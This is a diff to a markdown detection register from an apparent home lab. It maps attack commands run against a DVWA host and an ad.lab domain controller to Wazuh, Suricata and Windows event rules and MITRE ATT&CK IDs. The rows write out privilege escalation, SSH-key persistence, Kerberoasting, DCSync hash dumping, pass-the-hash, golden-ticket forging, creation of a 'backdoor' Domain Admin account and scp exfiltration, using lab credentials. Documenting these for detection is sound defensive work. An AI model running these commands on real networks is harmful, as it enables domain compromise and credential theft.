@@ -115,11 +115,11 @@ This register provides the definitive, unredacted catalog of Indicators of Compr
 | **Sudo Python** | `sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'` | DVWA | Wazuh Rule 5402 (PAM sudo to ROOT) | `T1548.003` |
 | **OpenSSH** | `echo "ssh-ed25519..." >> /root/.ssh/authorized_keys` | DVWA | Wazuh Rule 5715 / Rule 100220 (`bashcmd`) | `T1098.004` |
 | **Responder** | `python3 /opt/Responder/Responder.py -I ens33 -wd` | DVWA | Wazuh Rule 100220 (`bashcmd`) / Win10User Security EID 4688 DavSetCookie (Rule 100278) | `T1557.001` |
-| **BloodHound** | `bloodhound-python -u win10 -p Secur3Lab! -d ad.lab -dc PC-DC.ad.lab -c All` | DVWA -> DC | DomainWin10 Custom Rule 100615 & Rule 92657 (Alert #22) / Wazuh Rule 100220 / Rule 5715 | `T1087.002` |
+| **BloodHound** | `bloodhound-python -u win10 -p Secur3Lab! -d ad.lab -dc PC-DC.ad.lab -c All` | DVWA -> DC | DomainWin10 Custom Rule 100615 & Rule 92657 / Wazuh Rule 100220 / Rule 5715 (Alert #22) | `T1087.002` |
 | **Impacket SPNs** | `python3 GetUserSPNs.py ad.lab/win10:Secur3Lab! -dc-ip 192.168.56.10 -request` | DVWA -> DC | Suricata SID 2019922 (ET EXPLOIT Possible GoldenPac Priv Esc in-use [TGS-REQ wire frame]) & Wazuh Rule 100220 | `T1558.003` |
-| **Impacket DCSync** | `python3 secretsdump.py 'ad.lab/HANK_SHERMAN:Password123@192.168.56.10' -just-dc` | DVWA -> DC | DomainWin10 Custom Rule 100603 (EID 4672 SeDebugPrivilege) & Rule 92657 (Alert #24) / Wazuh Rule 100220 / Rule 5715 | `T1003.006` |
+| **Impacket DCSync** | `python3 secretsdump.py 'ad.lab/HANK_SHERMAN:Password123@192.168.56.10' -outputfile /tmp/dcsync_output` | DVWA -> DC | DomainWin10 Custom Rule 100603 (EID 4672 SeDebugPrivilege) & Rule 92657 / Wazuh Rule 100220 / Rule 5715 (Alert #24) | `T1003.006` |
 | **Impacket wmiexec** | `python3 wmiexec.py -hashes :... Administrator@192.168.56.10` | DVWA -> DC | Windows EID 4624 (Rule 92657) & Sysmon Custom Rule 100613 (TheHive Alerts #25, #26) | `T1550.002` |
-| **Impacket ticketer** | `python3 ticketer.py -nthash 611a8cdcc... -domain-sid S-1-5-21... -domain ad.lab Administrator` | DVWA | DomainWin10 Custom Rules 100615 & 100613 (TheHive Alerts #27, #28) / Wazuh Rule 100220 / Rule 5715 | `T1558.001` |
+| **Impacket ticketer** | `python3 ticketer.py -nthash 611a8cdcc... -domain-sid S-1-5-21... -domain ad.lab Administrator` | DVWA | DomainWin10 Custom Rules 100615 & 100613 (TheHive Alerts #27, #28) / Wazuh Rule 100220 | `T1558.001` |
 | **Net User Backdoor** | `cmd.exe /Q /c net user backdoor P@ssw0rd123! /add /domain` | DC (`192.168.56.10`) | Wazuh Rule 60109 / Windows EID 4720 | `T1136.002` |
 | **Net Localgroup DA** | `cmd.exe /Q /c net group "Domain Admins" backdoor /add /domain` | DC (`192.168.56.10`) | Wazuh Rule 60159 / Windows EID 4728 | `T1098` |
 | **SCP Exfiltration** | `scp -i id_ed25519 root@192.168.56.30:/tmp/*.txt .` | DVWA -> Kali | Wazuh Rule 5715 Rate Anomaly (6 in 570ms) | `T1041` |
